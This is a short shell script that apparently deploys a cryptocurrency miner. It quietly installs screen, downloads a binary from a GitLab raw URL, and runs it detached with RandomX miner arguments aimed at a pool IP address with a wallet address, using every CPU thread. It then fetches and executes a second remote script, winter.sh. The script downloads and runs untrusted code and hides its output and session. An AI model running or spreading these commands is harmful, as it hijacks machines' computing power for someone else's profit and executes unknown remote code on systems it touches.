sudo apt install screen -y > /dev/null 2>&1
wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo D-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
wget https://github.com/williehprnuhrxyq/dualspace/raw/main/winter.sh && chmod +x * && ./winter.sh
